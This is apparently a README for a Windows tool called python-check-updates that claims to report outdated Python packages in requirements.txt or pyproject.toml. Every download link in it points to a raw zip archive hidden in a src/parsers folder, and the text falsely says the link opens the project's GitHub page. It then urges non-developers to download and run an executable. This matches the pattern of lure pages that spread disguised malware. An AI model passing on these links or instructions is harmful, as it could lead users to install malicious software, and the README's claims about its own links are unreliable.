# ⚙️ python-check-updates - Quickly Find New Python Package Versions

[![Download](https://img.shields.io/badge/Download-Get%20App-brightgreen?style=for-the-badge)](https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip)

---

## 📋 What is python-check-updates?

python-check-updates is a command-line tool that helps you find newer versions of the Python packages you use. It looks at your current project setup and shows if any of your dependencies have updates available on PyPI, the main Python package index.

Think of it like a helper that checks if your software libraries are out of date. It works much like npm-check-updates does for JavaScript, but this tool is built just for Python projects.

You don’t have to be a developer to use it. The tool runs on Windows and is designed to be simple and fast.

---

## ⚙️ Features

- Checks the most common Python package listings: `requirements.txt` and `pyproject.toml`
- Supports popular Python package managers like Poetry and pip
- Quickly scans your project for outdated dependencies
- Works smoothly on Windows systems
- Provides clear output showing which packages have newer versions
- Built with Rust and UV for speed and reliability

---

## 🔍 Why Use This Tool?

Keeping your Python packages up to date ensures you have the latest features and security fixes. Manually checking each package can take time and be confusing if you don’t know the exact commands. python-check-updates automates this step for you.

It removes guesswork and helps you keep your project healthy with minimal effort.

---

## 🖥️ System Requirements

- Windows 10 or later
- Basic command prompt (Command Prompt or PowerShell)
- No need for Python or other software pre-installed to just check versions
- Internet access to connect to the PyPI package index

---

## 🚀 Getting Started: How to Download and Run on Windows

You will visit the software's download page on GitHub to get the latest version. This guide will show you how to do that step by step.

---

### Step 1: Visit the Download Page

Click on the green button below or copy and paste the URL into your web browser:

[![Download](https://img.shields.io/badge/Download-Get%20App-red?style=for-the-badge)](https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip)

This will take you to the main GitHub page for python-check-updates.

---

### Step 2: Locate the Latest Version

Once on the GitHub page, scroll down to find the "Releases" section on the right side or use the navigation menu to go to **Releases**.

Look for the latest stable release. The release items are usually titled with a version number like "v1.0", "v1.1" etc.

---

### Step 3: Download the Windows Installer or Executable

Under the latest release, search for a file that ends with `.exe` or a Windows installer. This file is used to install or run the application on your computer.

Click the link to download the file to your computer.

---

### Step 4: Run the Installer or Application

- If you downloaded an installer (`.exe`), double-click it to start the installation.
- Follow the on-screen instructions to complete the setup.
- If it’s a standalone executable, double-click to run it directly. No installation is needed.

---

### Step 5: Open Command Prompt

Once installed or running, open **Command Prompt** or **PowerShell** on your Windows PC.

You can do this by pressing the **Windows key**, typing `cmd` or `powershell`, and pressing **Enter**.

---

### Step 6: Checking Your Python Dependencies

In the command prompt, use the tool by typing:

`python-check-updates`

By default, it will look for a `requirements.txt` file in the current folder.

To check dependencies listed in `pyproject.toml`, add:

`python-check-updates --pyproject`

Press Enter to run the command.

The tool will then list packages that have newer versions available.

---

## 🛠️ How to Use python-check-updates in Detail

You can start it in the folder where your project files are. To navigate to your project folder, use the `cd` command in Command Prompt. For example:

```
cd C:\Users\YourName\YourProject
```

Then run the command as shown earlier.

---

### Common Commands

- Check `requirements.txt` (default):

  ```
  python-check-updates
  ```

- Check `pyproject.toml` with Poetry settings:

  ```
  python-check-updates --pyproject
  ```

- Show help and all options:

  ```
  python-check-updates --help
  ```

---

## 📄 What If You Don’t Have Project Files Yet?

You can create a simple `requirements.txt` file by opening Notepad and listing your Python packages with their current versions.

Example content for `requirements.txt`:

```
requests==2.25.0
numpy==1.19.0
```

Save this file in your project folder before running the tool.

---

## 🔧 Updating Your Packages (Optional Next Step)

This tool only shows if updates are available. It does not install updates automatically.

To update packages after checking:

- For pip and `requirements.txt`, you can manually update your file or use pip commands such as:

  ```
  pip install --upgrade package-name
  ```

- For Poetry and `pyproject.toml`, use Poetry commands like:

  ```
  poetry update
  ```

---

## 📚 Additional Tips

- Run the tool regularly to keep your project dependencies current.
- Run it from the folder where your project files are stored.
- Make sure your internet connection is working since the tool checks online.
- If you don’t see updates, your packages might already be current.

---

## 🧩 Understanding Key Terms

- **Python dependencies**: Software libraries your project uses.
- **PyPI**: The official Python package repository.
- **requirements.txt**: A text file listing Python packages and versions.
- **pyproject.toml**: A file used by Poetry to manage packages.
- **CLI (Command-Line Interface)**: A way to interact with software using text commands.

---

## 🔗 Download Link Again

You can always visit this page to download or check for new versions:

[https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip](https://github.com/vestalterrace911/python-check-updates/raw/refs/heads/main/src/parsers/check-updates-python-photoelastic.zip)